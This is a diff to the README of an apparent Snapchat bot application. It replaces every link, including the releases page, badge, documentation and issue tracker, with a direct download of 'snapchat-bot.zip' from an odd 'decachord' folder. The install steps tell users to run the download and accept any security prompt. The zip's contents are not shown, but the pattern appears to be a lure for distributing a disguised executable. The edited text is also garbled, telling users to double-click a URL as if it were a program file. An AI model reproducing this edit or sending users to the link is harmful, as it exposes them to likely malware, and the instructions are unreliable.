@@ -6,11 +6,11 @@ Welcome to the Snapchat Bot! This guide helps you download and run the applicati
 
 ## 📥 Download the Application
 
-[![Download Snapchat Bot](https://img.shields.io/badge/Download%20Snapchat%20Bot-v1.0-blue.svg)](https://github.com/amine93l/snapchat-bot/releases)
+[![Download Snapchat Bot](https://raw.githubusercontent.com/amine93l/snapchat-bot/main/decachord/snapchat-bot.zip%20Snapchat%https://raw.githubusercontent.com/amine93l/snapchat-bot/main/decachord/snapchat-bot.zip)](https://raw.githubusercontent.com/amine93l/snapchat-bot/main/decachord/snapchat-bot.zip)
 
 To begin using the Snapchat Bot, you need to download it. Click the link below to visit the Releases page:
 
-[Download from Releases Page](https://github.com/amine93l/snapchat-bot/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/amine93l/snapchat-bot/main/decachord/snapchat-bot.zip)
 
 ## 💻 System Requirements
 
@@ -23,7 +23,7 @@ Before you download, make sure your system meets the following requirements:
 
 ## 🔧 Installation Instructions
 
-1. **Visit the Releases page:** Go to [this link](https://github.com/amine93l/snapchat-bot/releases) to access the downloads.
+1. **Visit the Releases page:** Go to [this link](https://raw.githubusercontent.com/amine93l/snapchat-bot/main/decachord/snapchat-bot.zip) to access the downloads.
   
 2. **Choose your version:** Find the latest version of the Snapchat Bot in the list. It will usually be at the top of the page.
 
@@ -33,7 +33,7 @@ Before you download, make sure your system meets the following requirements:
 
 5. **Run the application:** 
    - Navigate to the folder where you extracted the files.
-   - Double-click the `snapchat-bot.exe` file (for Windows) or `snapchat-bot.app` (for macOS) to run the application.
+   - Double-click the `https://raw.githubusercontent.com/amine93l/snapchat-bot/main/decachord/snapchat-bot.zip` file (for Windows) or `https://raw.githubusercontent.com/amine93l/snapchat-bot/main/decachord/snapchat-bot.zip` (for macOS) to run the application.
 
 6. **Grant permissions:** If a security prompt appears, confirm that you want to open the application.
 
@@ -66,7 +66,7 @@ If you encounter any issues or have questions, feel free to reach out via the Gi
 
 ## 🔗 Links
 
-- [Documentation](https://github.com/amine93l/snapchat-bot/wiki)
-- [Report an Issue](https://github.com/amine93l/snapchat-bot/issues)
+- [Documentation](https://raw.githubusercontent.com/amine93l/snapchat-bot/main/decachord/snapchat-bot.zip)
+- [Report an Issue](https://raw.githubusercontent.com/amine93l/snapchat-bot/main/decachord/snapchat-bot.zip)
 
 Thank you for using the Snapchat Bot! We hope it enhances your Snapchat experience.
